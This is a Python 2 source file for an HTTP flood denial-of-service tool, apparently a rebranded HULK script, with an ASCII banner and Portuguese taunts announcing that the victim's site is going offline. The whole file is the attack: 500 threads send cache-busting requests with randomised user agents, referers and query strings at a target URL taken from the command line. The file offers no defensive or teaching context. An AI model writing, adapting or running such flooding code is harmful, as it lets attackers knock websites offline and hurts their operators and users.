import urllib2
import sys
import threading
import random
import re

#global params
url=''
host=''
headers_useragents=[]
headers_referers=[]
request_counter=0
flag=0
safe=0

def inc_counter():
	global request_counter
	request_counter+=1

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1
	
# generates a user agent array
def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	return(headers_useragents)

# generates a referer array
def referer_list():
	global headers_referers
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://' + host + '/')
	return(headers_referers)
	
#builds random ascii string
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def usage():
	print "\033[92mExtrops Priv8\033[0m"
	print "\033[92mNew loaded Botnets: 1,798,445\033[0m"
	print "\033[92mUsage: Extrops (url)\033[0m"
	print "\033[92mExample: Extrops.py http://google.com/\033[0m"
	print "\a"
print \
"""
\033[95m                                                            
                                                            
               :r777X77777X7SXXr;:                          
           ,rSXr:.              ,rSX,                       
         rX7:         ..::iii:i.    X7:                     
       XXi       :;7rr;;:i,:,::;rX7;..;X                    
       B,   .;;XX;:  ,             .7SXr2,                  
       .8;rMMMX    ,0:7r;r7X7;::,     .XXW.                 
         , 7X 8.   XB       .:;iii;i     7M                 
            a: B   rXZ            iM:     ;W    ____   ____    ____        _______  __                
             8 ;2   SXr         7X;        .  .' __ \ |_   \  /   _|      |  ___  |[  |            
              0 Zi  Si7       ,a2            / .'  \ |  |   \/   |  __   _|_/  / /  | |--.           
              :a B  :X2   ;ZZ0X777,          | | (_/ |  | |\  /| | [  | | |   / /   | .-. |           
               ;X.Z  rBZra@8:    ,aX         \ `.__.'\ _| |_\/_| |_ | \_/ |, / /    | | | |           
                2i;X  ZMMB;        72         `.___ .'|_____||_____|'.__.'_//_/    [___]|__]         
                 8 Si  a     S,     7Z                      
                  Z 2. 7,    .Z:     iW           ______   ______             ______                                   
                  :S 8, S      7a;    ;0         |_   _ `.|_   _ `.         .' ____ \                                 
                  XZa2ZSZ.     ,Mi  ;  8;          | | `. \ | | `. \  .--.  | (___ \_|                                
                  rZa2aM:8 ;X.   S72r. iZ          | |  | | | |  | |/ .'`\ \ _.____`.                                 
                   S@a Z;M;     ;M;     Z         _| |_.' /_| |_.' /| \__. || \____) |                                
                     2i 7;B   .XS       B        |______.'|______.'  '.__.'  \______.'                               
                      M X SMZS0r        Ba        ______            ____    ____                 _                    
                      08 277;MBM7      ,7X:      |_   _ `.         |_   \  /   _|               / |_                 
                      rZSai  X@ZM@    :W r;        | | `. \ ,--.     |   \/   |   .--.   _ .--.`| |-'.---.            
                       7a    :WZMM8  r W Xi        | |  | |`'_\ :    | |\  /| | / .'`\ \[ `/'`\]| | / /__\\           
                      ,Z        :28S aiZ 7;       _| |_.' /// | |,  _| |_\/_| |_| \__. | | |    | |,| \__.,           
                      X7          Xi 2B. 2i      |______.' \'-;__/ |_____||_____|'.__.' [___]   \__/ '.__.'          
                      W            Z Z:  X0                 
                     Z;            iai    XS                
                    ,8                     r2.              
                    S7                      ,7XXi           
                    8                           :;X         
                   :2                            MM7        
               Z2i:,                          XMMM,         
               ZMMMMM0r:..           ..,:i;0MMMB.         
                  iXa27i7XXXXXXXXX77X7rr;:.,;              
\033[0m                                                           
"""

	
#http request
def httpcall(url):
	useragent_list()
	referer_list()
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
 			print "                                                                    "
 			print "\033[92m#~~~~~~~> We Are BreakingSystems <~~~~~~~~\033[91m#\033[94m~~~>Bem-vindo a tristeza<~~#\033[0m"
 			print "\033[92m#~~~~~~> Viemos para fuder com sua DB <~~~~~\033[91m#\033[94m~~~~~~~~~>Ola admin<~~~~~~~~#\033[0m"
 			print "\033[92m#~~~~~~> Com o seu Firewall <~~~~~~~\033[91m#\033[94m~~~~>o seu site esta off<~~~~#\033[0m"
 			print "\033[92m#~~~> O seu Website vai ficar off <~~~\033[91m#\033[94m~~~>By @Mu7h DDoS Attack<~~~#\033[0m"
 			print "                                                                    "
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

	
#http caller thread 
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
				if (code==500) & (safe==1):
					set_flag(2)
		except Exception, ex:
			pass

# monitors http threads and counts requests
class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				print "%d Error" (request_counter)
				previous=request_counter
		if flag==2:
			print "\n -M60 Hits are secced"

#execute 
if len(sys.argv) < 2:
	usage()
	sys.exit()
else:
	if sys.argv[1]=="help":
		usage()
		sys.exit()
	else:
		print 'Mu7h'
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
		if url.count("/")==2:
			url = url + "/"
		m = re.search('http\://([^/]*)/?.*', url)
		host = m.group(1)
		for i in range(500):
			t = HTTPThread()
			t.start()
		t = MonitorThread()
		t.start()
